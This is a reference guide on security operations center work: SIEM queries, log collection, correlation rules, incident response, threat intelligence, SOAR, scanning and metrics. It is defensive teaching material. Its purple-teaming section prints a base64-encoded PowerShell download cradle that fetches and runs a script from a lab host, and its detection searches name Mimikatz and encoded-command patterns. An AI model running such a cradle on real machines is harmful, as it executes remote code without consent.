# Security Operations

Operating a Security Operations Center (SOC) including SIEM management, incident response, threat intelligence, SOAR automation, vulnerability management, and threat hunting.

## Concepts

### SOC Architecture

```
Tier 1 — Alert Triage (L1 Analyst)
  - Monitor SIEM dashboards and alert queues
  - Initial alert classification (true positive, false positive, benign true positive)
  - Ticket creation and documentation
  - Escalation to Tier 2 when analysis exceeds capability or SLA
  - Response time target: 15 minutes per alert

Tier 2 — Investigation (L2 Analyst)
  - Deep-dive investigation of escalated alerts
  - Correlation across multiple data sources
  - Containment actions (isolate host, block IP, disable account)
  - Root cause analysis
  - Incident documentation and timeline creation

Tier 3 — Advanced Analysis (L3 / Threat Hunter)
  - Proactive threat hunting (hypothesis-driven)
  - Malware analysis and reverse engineering
  - Detection engineering (write/tune correlation rules)
  - Incident response for complex/APT-level incidents
  - Purple teaming with red team
  - Threat intelligence production
```

### SOC Shift Model

```
# Common SOC coverage models:

# 24/7 — Three 8-hour shifts (requires minimum 5 FTEs per tier)
Shift A: 06:00-14:00  |  Shift B: 14:00-22:00  |  Shift C: 22:00-06:00

# 12/7 — Two 12-hour shifts (requires minimum 4 FTEs per tier)
Day: 06:00-18:00  |  Night: 18:00-06:00

# Follow-the-sun — Regional SOCs hand off to each other
Americas: 06:00-14:00 EST  |  EMEA: 14:00-22:00 CET  |  APAC: 22:00-06:00 SGT

# Key metrics per shift:
# - Alerts triaged per analyst per shift
# - Escalation rate (% alerts escalated to Tier 2)
# - Mean time to acknowledge (MTTA)
# - False positive rate (target: <30%)
```

## SIEM

### Splunk

```bash
# Splunk SPL (Search Processing Language) — common searches

# Failed login attempts in the last 24 hours
index=auth sourcetype=linux_secure "Failed password" earliest=-24h
| stats count by src_ip, user
| where count > 10
| sort -count

# Windows logon events (Event ID 4624/4625)
index=wineventlog EventCode=4625 earliest=-1h
| stats count by Account_Name, Source_Network_Address
| where count > 5

# Outbound connections to unusual ports
index=firewall action=allowed direction=outbound
| where NOT dest_port IN (80, 443, 53, 8080, 8443)
| stats count values(dest_ip) by src_ip, dest_port
| where count > 50

# Data exfiltration detection (large outbound transfers)
index=proxy
| stats sum(bytes_out) as total_bytes by src_ip, dest_domain
| where total_bytes > 104857600
| eval MB=round(total_bytes/1048576,2)
| sort -MB

# DNS query anomaly detection
index=dns
| stats count dc(query) as unique_queries by src_ip
| where unique_queries > 1000
| sort -unique_queries

# PowerShell execution logging (suspicious commands)
index=wineventlog sourcetype=WinEventLog:Microsoft-Windows-PowerShell/Operational
| search ScriptBlockText="*Invoke-Mimikatz*" OR ScriptBlockText="*Net.WebClient*"
  OR ScriptBlockText="*EncodedCommand*"
| table _time, ComputerName, ScriptBlockText

# Create a scheduled alert
# Settings > Searches, reports, and alerts > New Alert
# Cron: */15 * * * * (every 15 minutes)
# Trigger condition: Number of results > 0
# Action: Send email, create ticket, run script
```

### Elastic SIEM (Elasticsearch + Kibana)

```bash
# KQL (Kibana Query Language) examples

# Failed SSH logins
event.category: "authentication" AND event.outcome: "failure"
  AND process.name: "sshd"

# Suspicious process execution
process.name: ("powershell.exe" OR "cmd.exe" OR "wscript.exe")
  AND process.parent.name: ("winword.exe" OR "excel.exe" OR "outlook.exe")

# Network connections to known-bad IPs (using threat intel list)
destination.ip: (185.220.101.* OR 45.33.32.156)

# Elasticsearch query DSL — aggregation example
# POST /logs-*/_search
# {
#   "size": 0,
#   "query": {
#     "bool": {
#       "must": [
#         {"match": {"event.category": "authentication"}},
#         {"match": {"event.outcome": "failure"}}
#       ],
#       "filter": [
#         {"range": {"@timestamp": {"gte": "now-1h"}}}
#       ]
#     }
#   },
#   "aggs": {
#     "by_source_ip": {
#       "terms": {"field": "source.ip", "size": 10},
#       "aggs": {
#         "by_user": {
#           "terms": {"field": "user.name", "size": 5}
#         }
#       }
#     }
#   }
# }

# Detection rules in Elastic SIEM
# Kibana > Security > Rules > Create new rule
# Rule types: custom query, ML, threshold, EQL (Event Query Language)

# EQL example — process injection detection
# process where event.type == "start"
#   and process.parent.name == "svchost.exe"
#   and process.name in ("cmd.exe", "powershell.exe")
```

### Cisco SecureX

```
# SecureX integrates multiple Cisco security products:
# - Secure Endpoint (AMP) — endpoint telemetry
# - Umbrella — DNS security
# - Secure Firewall — network telemetry
# - Secure Email — email threat data
# - Duo — authentication telemetry

# SecureX ribbon — browser extension for pivoting
# Enter an observable (IP, hash, domain) to search across all products

# SecureX orchestration — automated workflows
# Pre-built workflows:
# - Block observable across Umbrella + Firewall + Endpoint
# - Enrich IP with Talos threat intelligence
# - Create ServiceNow ticket from Secure Endpoint alert
# - Quarantine endpoint + notify SOC via Webex

# Threat Response API
# POST https://visibility.amp.cisco.com/iroh/iroh-enrich/deliberate/observables
# Body: [{"type": "sha256", "value": "<hash>"}]
# Returns: verdicts from all integrated modules
```

## Log Sources and Collection

### Critical Log Sources

```
# Priority 1 — Must collect:
# - Authentication logs (AD, LDAP, RADIUS, SSO)
# - Firewall/IPS logs (allow/deny, intrusion alerts)
# - VPN logs (connections, disconnections, failed auth)
# - Email gateway logs (spam, phishing, malware detected)
# - Endpoint detection logs (AV, EDR alerts)
# - DNS logs (queries, responses, blocks)
# - Cloud audit logs (CloudTrail, Azure Activity, GCP Audit)

# Priority 2 — Should collect:
# - Web proxy logs (URLs visited, categories, bytes)
# - DHCP logs (IP assignment, lease events)
# - Application logs (web servers, databases, middleware)
# - OS security logs (Windows Security Event Log, syslog)
# - Certificate authority logs
# - Vulnerability scanner results

# Priority 3 — Nice to have:
# - NetFlow/IPFIX (network traffic metadata)
# - Full packet capture (high-value segments only)
# - Physical access control logs
# - Printer/MFP logs
# - IoT device logs
```

### Log Collection Architecture

```bash
# Syslog forwarding (rsyslog)
# /etc/rsyslog.d/50-forward.conf
# Forward all auth logs to SIEM
# auth,authpriv.*  @@siem.internal:514

# Filebeat (Elastic agent) — ship logs to Elasticsearch
# /etc/filebeat/filebeat.yml
# filebeat.inputs:
# - type: log
#   paths:
#     - /var/log/auth.log
#     - /var/log/syslog
#   fields:
#     log_type: system
#
# output.elasticsearch:
#   hosts: ["siem.internal:9200"]
#   index: "filebeat-%{+yyyy.MM.dd}"

# Splunk Universal Forwarder
# $SPLUNK_HOME/etc/system/local/inputs.conf
# [monitor:///var/log/auth.log]
# sourcetype = linux_secure
# index = auth
#
# [monitor:///var/log/syslog]
# sourcetype = syslog
# index = os

# Windows Event Forwarding (WEF) — centralized Windows log collection
# On collector: wecutil qc (quick config)
# On sources: GPO > Computer Configuration > Admin Templates >
#   Windows Components > Event Forwarding > Configure target subscription manager
# Subscription filter example (security events):
# <QueryList>
#   <Query Path="Security">
#     <Select>*[System[(EventID=4624 or EventID=4625 or EventID=4648
#       or EventID=4672 or EventID=4688 or EventID=4697
#       or EventID=4720 or EventID=4732)]]</Select>
#   </Query>
# </QueryList>
```

## Correlation Rules

```
# SIEM correlation rule patterns:

# Pattern 1: Threshold — N events in time window
# "Brute force detected: >10 failed logins from same source in 5 minutes"
# Trigger: count(failed_login) > 10 WHERE src_ip=X AND timewindow=5m

# Pattern 2: Sequence — ordered events within time window
# "Successful login after brute force"
# Trigger: failed_login(count>5) FOLLOWED BY successful_login
#          WHERE src_ip=X AND timewindow=15m

# Pattern 3: Absence — expected event did not occur
# "Endpoint stopped reporting"
# Trigger: NOT heartbeat FROM endpoint_id=X FOR 30m

# Pattern 4: Statistical anomaly — deviation from baseline
# "Unusual data transfer volume"
# Trigger: bytes_out > (baseline_avg + 3*baseline_stddev)
#          WHERE src_ip=X

# Pattern 5: Cross-source correlation
# "Lateral movement detected"
# Trigger: (authentication_success ON host_B FROM host_A)
#          AND (malware_detected ON host_A within last 1h)

# Pattern 6: Behavioral chain (kill chain mapping)
# "Possible APT activity"
# Trigger: phishing_email_clicked
#          FOLLOWED BY suspicious_process_execution (within 1h)
#          FOLLOWED BY internal_recon_scan (within 4h)
#          FOLLOWED BY lateral_movement (within 24h)
```

## Alert Triage Workflow

```
Alert received in SIEM queue
  |
  v
Step 1: Read the alert (30 seconds)
  - What rule fired? What data source?
  - Source IP/host, destination, user account
  - Timestamp and frequency
  |
  v
Step 2: Validate the alert (2-5 minutes)
  - Is the source/destination IP internal or external?
  - Is the user account a real user or service account?
  - Does the activity match the asset's normal behavior?
  - Check CMDB: what is this asset? Who owns it?
  |
  v
Step 3: Enrich with context (2-5 minutes)
  - Threat intel lookup on IPs, domains, hashes
  - Check other log sources for corroborating evidence
  - Check if this source has prior alerts
  - Geolocation of external IPs
  |
  v
Step 4: Classify (1 minute)
  - TRUE POSITIVE: confirmed malicious activity --> escalate/respond
  - FALSE POSITIVE: alert fired on benign activity --> document, tune rule
  - BENIGN TRUE POSITIVE: real activity, authorized --> document, adjust baseline
  - INDETERMINATE: cannot determine --> escalate to Tier 2
  |
  v
Step 5: Document and close/escalate
  - Record classification, evidence, and reasoning
  - If escalating: include all enrichment data
  - If closing: note tuning recommendations
```

## Incident Response (PICERL)

### NIST SP 800-61 Incident Response Lifecycle

```
Phase 1: PREPARATION
  - Incident response plan documented and approved
  - IR team roles and contact information
  - Communication templates (internal, external, legal, PR)
  - Forensic toolkit ready (disk imaging, memory capture, network capture)
  - Playbooks for common incident types
  - Regular tabletop exercises

Phase 2: IDENTIFICATION
  - Detect the incident (SIEM alert, user report, threat intel)
  - Determine scope: how many systems affected?
  - Determine severity: data exposure? Business impact?
  - Preserve evidence: start chain of custody documentation
  - Assign incident commander

Phase 3: CONTAINMENT
  Short-term containment:
    - Isolate affected hosts (network isolation, disable ports)
    - Block malicious IPs/domains at firewall
    - Disable compromised accounts
    - Preserve forensic evidence before changes
  Long-term containment:
    - Rebuild affected systems from known-good images
    - Apply patches that address the attack vector
    - Enhanced monitoring on affected segment

Phase 4: ERADICATION
  - Remove malware, backdoors, persistence mechanisms
  - Identify and close the initial access vector
  - Reset all potentially compromised credentials
  - Verify removal with thorough scanning
  - Confirm no remaining attacker access

Phase 5: RECOVERY
  - Restore systems from clean backups
  - Gradually reintroduce systems to production
  - Monitor closely for signs of re-compromise
  - Verify business functionality
  - Communicate restoration to stakeholders

Phase 6: LESSONS LEARNED
  - Post-incident review meeting (within 2 weeks)
  - Document timeline, decisions, and outcomes
  - Identify what worked and what did not
  - Update playbooks, detection rules, and procedures
  - File incident report for compliance/legal
```

### Common IR Commands

```bash
# Memory acquisition (Linux)
sudo insmod /path/to/lime.ko "path=/evidence/mem.lime format=lime"

# Memory acquisition (Windows — WinPmem)
winpmem_mini_x64.exe output.raw

# Disk imaging (Linux)
sudo dc3dd if=/dev/sda of=/evidence/disk.dd hash=sha256 log=/evidence/dc3dd.log

# Volatile data collection (Linux)
date > /evidence/volatile/timestamp.txt
ps auxf > /evidence/volatile/processes.txt
netstat -tulnp > /evidence/volatile/network.txt
ss -tulnp > /evidence/volatile/sockets.txt
lsof -i > /evidence/volatile/open_files.txt
cat /proc/net/arp > /evidence/volatile/arp.txt
ip route show > /evidence/volatile/routes.txt
last -f /var/log/wtmp > /evidence/volatile/logins.txt

# Volatile data collection (Windows)
tasklist /V > C:\evidence\processes.txt
netstat -anob > C:\evidence\network.txt
ipconfig /all > C:\evidence\network_config.txt
net user > C:\evidence\users.txt
net session > C:\evidence\sessions.txt
wmic process list full > C:\evidence\wmic_processes.txt

# File hash verification
sha256sum /evidence/disk.dd
md5sum /evidence/disk.dd

# Timeline creation with plaso/log2timeline
log2timeline.py /evidence/timeline.plaso /evidence/disk.dd
psort.py -w /evidence/timeline.csv /evidence/timeline.plaso
```

## Threat Intelligence

### STIX/TAXII

```
# STIX (Structured Threat Information eXpression)
# Standard format for threat intelligence sharing
# Version: STIX 2.1

# STIX Domain Objects (SDO):
# - Attack Pattern: TTP description (maps to MITRE ATT&CK)
# - Campaign: set of malicious activities attributed to an actor
# - Course of Action: recommended response or mitigation
# - Identity: individuals, organizations, or groups
# - Indicator: pattern to detect suspicious activity
# - Intrusion Set: adversary behaviors and resources
# - Malware: malicious code or software
# - Observed Data: raw observations (logs, network traffic)
# - Threat Actor: individuals or groups operating with malicious intent
# - Tool: legitimate software used by adversaries
# - Vulnerability: flaw in software (CVE)

# TAXII (Trusted Automated Exchange of Indicator Information)
# Transport mechanism for STIX data
# Two services:
# - Collection: server-hosted repository of CTI (pull model)
# - Channel: publish-subscribe feed (push model)

# Example: query a TAXII server for indicators
# GET https://taxii.example.com/api/collections/
# GET https://taxii.example.com/api/collections/{id}/objects/
#   ?match[type]=indicator&added_after=2026-04-01
```

### MISP (Malware Information Sharing Platform)

```bash
# MISP — open-source threat intelligence platform

# API — search for indicators
curl -s -H "Authorization: <api-key>" \
  -H "Content-Type: application/json" \
  "https://misp.internal/attributes/restSearch" \
  -d '{"type": "ip-dst", "value": "185.220.101.42"}'

# API — add an indicator
curl -s -H "Authorization: <api-key>" \
  -H "Content-Type: application/json" \
  -X POST "https://misp.internal/events/addAttribute/12345" \
  -d '{
    "type": "ip-dst",
    "value": "10.20.30.40",
    "category": "Network activity",
    "to_ids": true,
    "comment": "C2 server observed in incident IR-2026-042"
  }'

# MISP feeds — subscribe to community threat intel
# Settings > Server Settings > Feeds
# Built-in feeds: abuse.ch, Botvrij, CIRCL OSINT
# Feeds auto-import indicators on schedule
```

## SOAR (Security Orchestration, Automation, and Response)

```
# SOAR automates repetitive SOC tasks

# Example playbook: Phishing email response
# Trigger: email reported by user via phishing button

# Step 1: Extract observables
#   - Parse email headers (From, Return-Path, Received)
#   - Extract URLs from email body
#   - Extract attachments and compute hashes

# Step 2: Enrich observables
#   - Check URLs against URL reputation (VirusTotal, URLhaus)
#   - Check sender domain reputation
#   - Check file hashes against threat intel
#   - Check sender against known good list

# Step 3: Decision
#   IF any observable is malicious:
#     - Quarantine email from all mailboxes (Exchange/O365 API)
#     - Block sender domain at email gateway
#     - Block URLs at web proxy
#     - Block file hashes at endpoint (Secure Endpoint SCD)
#     - Create incident ticket
#     - Notify SOC analyst
#   ELSE IF suspicious but not confirmed:
#     - Submit attachments to sandbox
#     - Escalate to Tier 2
#   ELSE:
#     - Mark as not phishing
#     - Thank reporting user

# Step 4: Document
#   - Record all enrichment results
#   - Record actions taken
#   - Update metrics (time to respond, analyst who handled)

# SOAR platforms:
# - Splunk SOAR (formerly Phantom)
# - Palo Alto Cortex XSOAR (formerly Demisto)
# - IBM QRadar SOAR (formerly Resilient)
# - Google Chronicle SOAR (formerly Siemplify)
# - Swimlane, Tines, Torq
```

## Vulnerability Management

### Lifecycle

```
Step 1: Discovery
  - Asset inventory (what do we have?)
  - Network scanning (Nmap, Masscan for port/service discovery)
  - Agent-based inventory (installed software versions)

Step 2: Assessment
  - Vulnerability scanning (Nessus, Qualys, Rapid7 InsightVM)
  - Authenticated vs unauthenticated scans
  - Scan frequency: critical assets weekly, others monthly

Step 3: Prioritization
  - CVSS score (base, temporal, environmental)
  - Exploit availability (EPSS — Exploit Prediction Scoring System)
  - Asset criticality (crown jewels get priority)
  - Compensating controls (is the vuln mitigated by other means?)

Step 4: Remediation
  - Patch (preferred, permanent fix)
  - Workaround (temporary, when patch unavailable)
  - Accept risk (documented exception with business approval)
  - Remediation SLAs:
    Critical (CVSS 9.0-10.0): 7 days
    High (CVSS 7.0-8.9): 30 days
    Medium (CVSS 4.0-6.9): 90 days
    Low (CVSS 0.1-3.9): next maintenance window

Step 5: Verification
  - Re-scan to confirm remediation
  - Validate patch did not break functionality
  - Update asset inventory

Step 6: Reporting
  - Vulnerability aging report (how long vulns remain open)
  - Remediation rate (% fixed within SLA)
  - Risk trend over time
  - Exception report (accepted risks with expiration dates)
```

### Scanning Commands

```bash
# Nmap — network vulnerability scanning
nmap -sV --script vuln -oX scan_results.xml 10.0.0.0/24

# Nessus CLI (nesscli)
nessuscli scan --targets=10.0.0.0/24 --policy="Basic Network Scan" \
  --output=results.nessus

# OpenVAS/GVM — open-source vulnerability scanner
# Create a target
gvm-cli tls --hostname gvm.internal \
  -c "create_target name='prod-servers' hosts='10.0.1.0/24'"

# Start a scan
gvm-cli tls --hostname gvm.internal \
  -c "create_task name='weekly-scan' target_id=<target-id> config_id=<config-id>"
```

## Security Metrics

### Key Metrics

```
# Detection metrics:
# MTTD (Mean Time to Detect): average time from compromise to detection
#   Industry average: 197 days (Mandiant M-Trends 2024)
#   Target: <24 hours for critical assets

# Response metrics:
# MTTR (Mean Time to Respond): average time from detection to containment
#   Target: <4 hours for critical incidents
# MTTA (Mean Time to Acknowledge): time from alert to analyst assignment
#   Target: <15 minutes

# Dwell time: total time attacker has access (MTTD + time before detection)
#   Target: <48 hours

# SOC operational metrics:
# Alert volume: total alerts per day/week
# True positive rate: % of alerts that are actual incidents
# False positive rate: % of alerts that are benign (target: <30%)
# Escalation rate: % of Tier 1 alerts escalated to Tier 2
# Analyst utilization: alerts handled per analyst per shift
# Coverage: % of environment monitored by SIEM

# Vulnerability management metrics:
# Mean time to remediate (by severity)
# % of assets scanned in last 30 days
# Vulnerability aging (average days open)
# Exception rate (% of vulns with accepted risk)
```

## Threat Hunting

### Methodology

```
# Structured threat hunting process:

# 1. Generate hypothesis
#    Sources: threat intel reports, MITRE ATT&CK,
#    industry alerts, purple team findings
#    Example: "APT group X targets our industry using
#    DLL side-loading via legitimate signed binaries"

# 2. Define hunt scope
#    - Which data sources to query (endpoint, network, auth)
#    - Time window (last 30 days, 90 days)
#    - Which assets to focus on (DMZ, domain controllers, VPN)

# 3. Execute hunt queries
#    - Write SIEM queries targeting the hypothesis
#    - Look for evidence supporting or refuting
#    - Iterate and refine queries based on initial results

# 4. Analyze findings
#    - Distinguish malicious from benign
#    - Identify patterns and anomalies
#    - Correlate across data sources

# 5. Document results
#    - Findings (positive or negative)
#    - New detection rules to automate the hunt
#    - Gaps identified (missing log sources, visibility gaps)
#    - Recommended remediations

# 6. Operationalize
#    - Convert successful hunts into automated detection rules
#    - Update playbooks with new response procedures
#    - Share findings with threat intel team
```

## Purple Teaming

```
# Purple teaming: collaborative exercise between red team
# (attack) and blue team (defense)

# Process:
# 1. Select ATT&CK techniques to test
# 2. Red team executes technique in controlled manner
# 3. Blue team attempts to detect in real time
# 4. Both teams compare notes:
#    - Was the attack detected?
#    - Which log source captured it?
#    - How long until detection?
#    - What was the alert fidelity?
# 5. Tune detections and repeat

# Atomic Red Team — test individual ATT&CK techniques
# https://github.com/redcanaryco/atomic-red-team

# Example: Test T1059.001 (PowerShell execution)
# Red team executes:
# powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwB0AGUAcwB0AC4AcABzADEAJwApAA==
# (Base64-encoded IEX download cradle)

# Blue team checks:
# - Did SIEM alert fire for encoded PowerShell?
# - Did EDR detect the download cradle?
# - Was the network connection logged by proxy/firewall?
# - How many seconds until alert appeared?

# Score results:
# Detected + alerted = PASS
# Detected but no alert = PARTIAL (tuning needed)
# Not detected = FAIL (new rule needed)
```

## SOC Automation

```bash
# Automation opportunities by tier:

# Tier 0 (fully automated, no analyst):
# - Known false positive suppression
# - Automated enrichment (IP/domain/hash reputation lookup)
# - Auto-close benign true positives matching known patterns
# - Ticket creation and routing

# Tier 1 automation assists:
# - Pre-populated investigation worksheets
# - One-click containment actions (isolate host, block IP)
# - Automated evidence collection
# - Context gathering (asset info, user info, recent alerts)

# Tier 2 automation assists:
# - Automated timeline generation
# - Sandbox submission for unknown files
# - Cross-source correlation queries pre-run
# - Playbook-guided response steps

# Example: automated enrichment script
# Input: alert with src_ip, dest_ip, file_hash
# Output: enriched alert with threat intel context

# curl -s "https://www.virustotal.com/api/v3/ip_addresses/$DEST_IP" \
#   -H "x-apikey: $VT_KEY" | jq '.data.attributes.last_analysis_stats'

# curl -s "https://www.virustotal.com/api/v3/files/$FILE_HASH" \
#   -H "x-apikey: $VT_KEY" | jq '.data.attributes.last_analysis_stats'

# curl -s "https://otx.alienvault.com/api/v1/indicators/IPv4/$DEST_IP/general" \
#   -H "X-OTX-API-KEY: $OTX_KEY" | jq '.pulse_info.count'
```

## Playbooks and Runbooks

```
# Playbook: structured response procedure for a specific incident type
# Runbook: step-by-step operational procedure for a specific task

# Essential playbooks every SOC needs:
# 1. Phishing email response
# 2. Malware infection
# 3. Ransomware
# 4. Data exfiltration / data breach
# 5. Compromised account
# 6. DDoS attack
# 7. Insider threat
# 8. Unauthorized access
# 9. Vulnerability exploitation (zero-day)
# 10. Supply chain compromise

# Playbook template:
# - Purpose: what incident type this covers
# - Scope: which assets/systems are in scope
# - Severity classification criteria
# - Detection sources (which alerts trigger this playbook)
# - Initial triage steps
# - Containment actions (with approval requirements)
# - Investigation steps (with specific queries/commands)
# - Eradication steps
# - Recovery steps
# - Communication requirements (who to notify, when)
# - Evidence preservation requirements
# - Escalation criteria and contacts
# - Metrics to capture
```

## Tips

- Build detection rules from known attack techniques (MITRE ATT&CK), not from imagined scenarios; attackers follow patterns.
- Automate enrichment first — it saves the most analyst time and requires the least risk.
- Measure false positive rate per rule and tune or disable rules above 70% false positive rate; they create alert fatigue.
- Collect authentication logs from every system; compromised credentials are the most common initial access vector.
- Use log retention policies aligned with compliance requirements; 90 days hot, 1 year warm, 7 years cold is a common baseline.
- Run tabletop exercises quarterly; incident response skills degrade rapidly without practice.
- Integrate threat intelligence feeds into SIEM for automated IoC matching; manual lookups do not scale.
- Document every incident response action with timestamps; this is critical for legal proceedings and compliance.
- Use SOAR for phishing response first — it is the highest-volume, most-automatable incident type in most organizations.
- Prioritize vulnerabilities by exploitability (EPSS score) and asset criticality, not just CVSS score; a CVSS 7.0 on an internet-facing server is more urgent than a CVSS 9.8 on an isolated dev box.
- Establish a threat hunting cadence (weekly or biweekly); ad-hoc hunting does not produce consistent results.
- Track dwell time as your north star metric; it directly measures your ability to detect and respond before significant damage.

## See Also

- endpoint-security, cloud-security, iptables, nftables, tcpdump

## References

- [NIST SP 800-61 Rev 2 — Computer Security Incident Handling Guide](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final)
- [NIST SP 800-137 — Information Security Continuous Monitoring](https://csrc.nist.gov/publications/detail/sp/800-137/final)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [MITRE D3FEND — Defensive Techniques](https://d3fend.mitre.org/)
- [Splunk SPL Reference](https://docs.splunk.com/Documentation/Splunk/latest/SearchReference)
- [Elastic SIEM Documentation](https://www.elastic.co/guide/en/security/current/index.html)
- [STIX/TAXII Specification](https://oasis-open.github.io/cti-documentation/)
- [MISP Project Documentation](https://www.misp-project.org/documentation/)
- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)
- [FIRST CVSS Calculator](https://www.first.org/cvss/calculator/3.1)
- [Mandiant M-Trends Report](https://www.mandiant.com/m-trends)
